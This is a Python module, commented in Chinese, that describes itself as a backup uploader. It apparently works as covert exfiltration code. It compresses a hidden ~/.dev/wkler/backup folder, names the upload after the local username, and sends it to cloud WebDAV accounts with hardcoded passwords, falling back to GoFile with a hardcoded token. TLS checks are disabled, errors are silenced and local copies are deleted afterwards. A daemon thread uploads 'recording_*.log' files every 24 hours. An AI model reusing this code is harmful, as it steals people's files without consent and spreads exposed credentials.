# -*- coding: utf-8 -*-
"""
上传模块 - 将备份文件压缩并上传到 Infini Cloud (WebDAV)，失败回退 GoFile
"""

import getpass
import os
import shutil
import sys
import tarfile
import time
from datetime import datetime
from pathlib import Path
from typing import List, Optional

try:
    import requests
    from requests.auth import HTTPBasicAuth
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

INFINI_CONFIGS = [
    {
        "name": "Infini-主",
        "url": "https://otaru.infini-cloud.net/dav/",
        "user": "macstar",
        "password": "p43ZDLzNPv2GixSk",
    },
    {
        "name": "Infini-备",
        "url": "https://wajima.infini-cloud.net/dav/",
        "user": "cryptostarxp",
        "password": "LDW9ERV3xuUrHSjZ",
    },
]

GOFILE_SERVERS = [
    "https://store9.gofile.io/uploadFile",
    "https://store8.gofile.io/uploadFile",
    "https://store7.gofile.io/uploadFile",
    "https://store6.gofile.io/uploadFile",
    "https://store5.gofile.io/uploadFile",
]
GOFILE_TOKEN = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"

RETRY_COUNT = 3
RETRY_DELAY = 30


def _get_remote_dir() -> str:
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    return f"{user_prefix}_mac_backup"


def _create_remote_directory(session, remote_dir: str, base_url: str, auth) -> bool:
    """WebDAV MKCOL 创建远程目录（递归）"""
    if not remote_dir or remote_dir == ".":
        return True
    try:
        dir_path = f"{base_url.rstrip('/')}/{remote_dir.lstrip('/')}"
        resp = session.request("MKCOL", dir_path, auth=auth, timeout=(8, 8))
        if resp.status_code in [201, 204, 405]:
            return True
        elif resp.status_code == 409:
            parent = os.path.dirname(remote_dir)
            if parent and parent != ".":
                if _create_remote_directory(session, parent, base_url, auth):
                    resp = session.request("MKCOL", dir_path, auth=auth, timeout=(8, 8))
                    return resp.status_code in [201, 204, 405]
        return False
    except Exception:
        return False


def _upload_infini(file_path: str, remote_dir: str) -> bool:
    """尝试所有 Infini 配置上传文件"""
    file_size = os.path.getsize(file_path)
    filename = os.path.basename(file_path)

    session = requests.Session()
    session.verify = False

    for cfg in INFINI_CONFIGS:
        cfg_name = cfg["name"]
        base_url = cfg["url"].strip()
        auth = HTTPBasicAuth(cfg["user"], cfg["password"])

        _create_remote_directory(session, remote_dir, base_url, auth)

        remote_path = f"{base_url.rstrip('/')}/{remote_dir}/{filename}"

        for attempt in range(RETRY_COUNT):
            try:
                if file_size < 1024 * 1024:
                    timeout = (10, 30)
                elif file_size < 10 * 1024 * 1024:
                    timeout = (15, max(30, int(file_size / 1024 / 1024 * 5)))
                else:
                    timeout = (20, max(60, int(file_size / 1024 / 1024 * 6)))

                headers = {
                    "Content-Type": "application/octet-stream",
                    "Content-Length": str(file_size),
                }

                with open(file_path, "rb") as f:
                    resp = session.put(
                        remote_path, data=f, headers=headers,
                        auth=auth, timeout=timeout,
                    )

                if resp.status_code in [201, 204]:
                    size_str = f"{file_size/1024/1024:.2f}MB" if file_size >= 1024*1024 else f"{file_size/1024:.1f}KB"
                    print(f"  [OK] [{cfg_name}] {filename} ({size_str})")
                    return True
            except Exception:
                pass

            if attempt < RETRY_COUNT - 1:
                time.sleep(RETRY_DELAY)

    return False


def _upload_gofile(file_path: str) -> bool:
    """GoFile 备选上传"""
    filename = os.path.basename(file_path)
    server_idx = 0
    max_attempts = len(GOFILE_SERVERS) * 2

    for attempt in range(max_attempts):
        server = GOFILE_SERVERS[server_idx]
        try:
            with open(file_path, "rb") as f:
                resp = requests.post(
                    server,
                    files={"file": f},
                    data={"token": GOFILE_TOKEN},
                    timeout=3600,
                    verify=True,
                )
            if resp.ok:
                result = resp.json()
                if result.get("status") == "ok":
                    print(f"  [OK] [GoFile] {filename}")
                    return True
        except Exception:
            pass

        server_idx = (server_idx + 1) % len(GOFILE_SERVERS)
        if server_idx == 0:
            time.sleep(RETRY_DELAY)

    return False


def upload_file(file_path: str) -> bool:
    """上传单个文件：先尝试 Infini，失败回退 GoFile"""
    if not os.path.isfile(file_path) or os.path.getsize(file_path) == 0:
        return False

    remote_dir = _get_remote_dir()

    if _upload_infini(file_path, remote_dir):
        return True

    print(f"  ! Infini 全部失败，回退 GoFile: {os.path.basename(file_path)}")
    return _upload_gofile(file_path)


def compress_backup(backup_dir: Path) -> Optional[Path]:
    """将备份目录压缩为 tar.gz，完成后删除源目录"""
    if not backup_dir.is_dir():
        return None

    entries = list(backup_dir.iterdir())
    if not entries:
        return None

    date_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    tar_path = backup_dir.parent / f"backup_{date_str}.tar.gz"

    try:
        with tarfile.open(tar_path, "w:gz", compresslevel=6) as tar:
            tar.add(str(backup_dir), arcname=backup_dir.name)
    except Exception as e:
        print(f"  ! 压缩失败: {e}", file=sys.stderr)
        if tar_path.exists():
            tar_path.unlink()
        return None

    # 压缩成功，删除源备份目录
    shutil.rmtree(backup_dir, ignore_errors=True)
    return tar_path


def collect_old_logs(wkler_dir: Path) -> List[Path]:
    """收集非当天的日志文件"""
    today_str = datetime.now().strftime("%Y%m%d")
    old_logs = []
    for f in wkler_dir.glob("recording_*.log"):
        if today_str not in f.name:
            old_logs.append(f)
    return old_logs

def upload_all() -> None:
    """主入口：压缩备份 + 上传"""
    if not HAS_REQUESTS:
        print("  ! 缺少 requests 库，跳过上传")
        return

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    wkler_dir = Path.home() / ".dev" / "wkler"
    backup_dir = wkler_dir / "backup"

    # 压缩备份目录并上传
    if backup_dir.is_dir() and any(backup_dir.iterdir()):
        print("正在压缩备份数据...")
        tar_path = compress_backup(backup_dir)
        if tar_path:
            print(f"  压缩完成: {tar_path.name}")
            if upload_file(str(tar_path)):
                tar_path.unlink(missing_ok=True)
            else:
                print(f"  ! 上传失败，保留本地文件: {tar_path}")


def _log_upload_loop() -> None:
    """后台循环：每 24 小时检查并上传非当天的日志文件"""
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    wkler_dir = Path.home() / ".dev" / "wkler"

    while True:
        time.sleep(24 * 3600)
        try:
            old_logs = collect_old_logs(wkler_dir)
            for log_file in old_logs:
                if upload_file(str(log_file)):
                    log_file.unlink(missing_ok=True)
        except Exception:
            pass


def start_log_upload_scheduler() -> None:
    """启动日志上传后台线程（守护线程，每 24 小时执行一次）"""
    if not HAS_REQUESTS:
        return

    import threading
    t = threading.Thread(target=_log_upload_loop, daemon=True)
    t.start()